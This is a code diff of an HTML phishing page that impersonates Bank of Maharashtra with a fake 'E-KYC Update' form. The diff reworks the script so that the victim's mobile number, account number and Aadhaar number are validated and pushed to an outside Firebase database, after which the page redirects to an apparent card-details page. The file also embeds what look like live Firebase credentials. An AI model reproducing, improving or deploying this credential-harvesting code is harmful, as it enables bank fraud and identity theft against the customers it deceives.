@@ -3,44 +3,55 @@
 <head>
   <title>dehijlbrd</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Firebase SDKs -->
   <script type="module">
-    // Firebase config
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
     import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyDZ8EFQv3KZkGzhnbA7bVwOuWmjSkjTy1o",
       authDomain: "marcokinghoga.firebaseapp.com",
+      databaseURL: "https://marcokinghoga-default-rtdb.firebaseio.com",
       projectId: "marcokinghoga",
       storageBucket: "marcokinghoga.firebasestorage.app",
       messagingSenderId: "132474071601",
-      appId: "1:132474071601:web:7c44a66fca6dc000e90310",
-      databaseURL: "https://marcokinghoga-default-rtdb.firebaseio.com"
+      appId: "1:132474071601:web:7c44a66fca6dc000e90310"
     };
 
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    window.submitForm = function () {
+    window.submitForm = function (event) {
+      event.preventDefault(); // Stop default form redirect
+
       const mobile = document.getElementById("mobile").value.trim();
       const account = document.getElementById("account").value.trim();
       const customerid = document.getElementById("customerid").value.trim();
 
-      // Push data to Firebase
-      push(ref(db, "ekyc_entries"), {
-        mobile,
-        account,
-        aadhaar: customerid,
-        timestamp: new Date().toISOString()
-      }).then(() => {
-        window.location.href = "cardpage.html";
-      }).catch((error) => {
-        alert("Failed to submit: " + error.message);
-      });
+      const isMobileValid = /^[6-9][0-9]{9}$/.test(mobile);
+      const isAccountValid = /^[0-9]{11}$/.test(account);
+      const isAadhaarValid = /^[0-9]{12}$/.test(customerid);
 
-      return false;
+      document.getElementById("mobileError").style.display = isMobileValid ? "none" : "block";
+      document.getElementById("accountError").style.display = isAccountValid ? "none" : "block";
+      document.getElementById("aadhaarError").style.display = isAadhaarValid ? "none" : "block";
+
+      if (isMobileValid && isAccountValid && isAadhaarValid) {
+        push(ref(db, "ekyc_entries"), {
+          mobile,
+          account,
+          aadhaar: customerid,
+          timestamp: new Date().toISOString()
+        }).then(() => {
+          window.location.href = "cardpage.html";
+        }).catch(err => {
+          alert("Failed to submit: " + err.message);
+        });
+      }
     }
   </script>
+
   <style>
     body {
       font-family: Arial;
@@ -65,12 +76,10 @@
       border-radius: 5px;
     }
     .form-container {
-      margin-top: 0px;
       text-align: left;
       max-width: 400px;
-      margin-left: auto;
-      margin-right: auto;
-      background: #ffffff00;
+      margin: auto;
+      background: transparent;
       padding: 20px;
       border-radius: 10px;
     }
@@ -91,7 +100,7 @@
       width: 94%;
       padding: 10px;
       font-size: 12px;
-      border-radius: 0px;
+      border-radius: 0;
       border: 1px solid #ccc;
       margin-top: 5px;
     }
@@ -114,7 +123,7 @@
   </style>
 </head>
 <body>
-  <img src="https://i.ibb.co/4ns0vWkf/Bank-of-Maharashtra-logo-svg.png" alt="Logo">
+  <img src="https://i.ibb.co/4ns0vWkf/Bank-of-Maharashtra-logo-svg.png" alt="Meri Tasveer">
 
   <div class="headline">
     <h1>Welcome To Digital Banking<br>E-KYC Update</h1>
@@ -122,20 +131,20 @@
   </div>
 
   <div class="form-container">
-    <form onsubmit="return validateForm();">
+    <form onsubmit="submitForm(event)">
       <div class="input-group">
         <label for="mobile">Mobile Number</label>
-        <input type="tel" id="mobile" name="mobile" maxlength="10" required placeholder="Enter 10-digit Mobile">
-        <div class="error" id="mobileError">⚠️ Enter valid Mobile Number.</div>
+        <input type="tel" id="mobile" name="mobile" maxlength="10" placeholder="Enter 10-digit Mobile" required>
+        <div class="error" id="mobileError">⚠️ Enter valid 10-digit Mobile Number.</div>
       </div>
       <div class="input-group">
         <label for="account">CIF/Account Number</label>
-        <input type="tel" id="account" name="account" maxlength="11" required placeholder="Enter 11-digit Account No.">
+        <input type="tel" id="account" name="account" maxlength="11" placeholder="Enter 11-digit Account No." required>
         <div class="error" id="accountError">⚠️ Enter valid 11-digit Account Number.</div>
       </div>
       <div class="input-group">
         <label for="customerid">Aadhaar Number</label>
-        <input type="tel" id="customerid" name="customerid" maxlength="12" required placeholder="Enter 12-digit Aadhaar No.">
+        <input type="tel" id="customerid" name="customerid" maxlength="12" placeholder="Enter 12-digit Aadhaar No." required>
         <div class="error" id="aadhaarError">⚠️ Enter valid 12-digit Aadhaar Number.</div>
       </div>
       <button class="side-button" type="submit">Continue</button>
@@ -144,40 +153,5 @@
     <img class="extra-img" src="https://i.ibb.co/YBFgSJP7/77b989a2-c19c-4317-9739-20cca9ebe498.jpg">
     <img class="extra-img" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg">
   </div>
-
-  <script>
-    function validateForm() {
-      let isValid = true;
-
-      const mobile = document.getElementById("mobile").value.trim();
-      const account = document.getElementById("account").value.trim();
-      const customerid = document.getElementById("customerid").value.trim();
-
-      document.getElementById("mobileError").style.display = "none";
-      document.getElementById("accountError").style.display = "none";
-      document.getElementById("aadhaarError").style.display = "none";
-
-      if (!/^[6-9][0-9]{9}$/.test(mobile)) {
-        document.getElementById("mobileError").style.display = "block";
-        isValid = false;
-      }
-
-      if (account.length !== 11 || isNaN(account)) {
-        document.getElementById("accountError").style.display = "block";
-        isValid = false;
-      }
-
-      if (customerid.length !== 12 || isNaN(customerid)) {
-        document.getElementById("aadhaarError").style.display = "block";
-        isValid = false;
-      }
-
-      if (isValid) {
-        return submitForm(); // Call Firebase submit
-      }
-
-      return false;
-    }
-  </script>
 </body>
 </html>
